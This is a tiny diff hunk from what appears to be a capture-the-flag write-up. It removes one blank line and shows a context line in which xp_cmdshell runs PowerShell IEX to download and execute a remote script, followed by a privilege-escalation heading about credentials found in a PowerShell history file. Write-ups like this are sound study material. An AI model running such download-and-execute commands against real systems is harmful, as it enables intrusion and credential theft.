@@ -70,7 +70,6 @@ SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"ht
 ```
 
 ---
-
 ### Privilege Escalation
 
 Powershell history file reveals admin credentials
